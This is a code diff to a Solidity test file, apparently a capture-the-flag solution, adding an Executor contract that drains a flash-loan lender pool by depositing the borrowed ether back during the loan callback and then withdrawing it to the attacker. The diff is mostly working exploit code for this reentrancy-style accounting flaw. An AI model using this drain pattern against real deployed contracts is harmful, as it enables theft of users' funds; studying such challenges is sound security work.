@@ -3,6 +3,32 @@ pragma solidity ^0.8.0;
 
 import "./utils/FlashBankFixture.sol";
 
+contract Executor is IFlashLoanEtherReceiver {
+    using Address for address payable;
+
+    FlashBankLenderPool pool;
+    address owner;
+
+    constructor(FlashBankLenderPool _pool) {
+        owner = msg.sender;
+        pool = _pool;
+    }
+
+    function execute() external payable {
+        require(msg.sender == address(pool), "only pool");
+        pool.deposit{value: msg.value}();
+    }
+
+    function hack() external {
+        require(msg.sender == owner, "only owner");
+        uint256 poolBalance = address(pool).balance;
+        pool.flashLoan(poolBalance);
+        pool.withdraw();
+        payable(owner).sendValue(address(this).balance);
+    }
+
+    receive () external payable {}
+}
 contract FlashBankTest is FlashBankFixture {
     
     function setUp() public override {
@@ -14,9 +40,9 @@ contract FlashBankTest is FlashBankFixture {
         vm.startPrank(attacker);
 
         console.log(address(pool).balance);
-        pool.flashLoan(1000);
+        Executor executor = new Executor(pool);
+        executor.hack();
         console.log(address(pool).balance);
-
 
 
         vm.stopPrank();
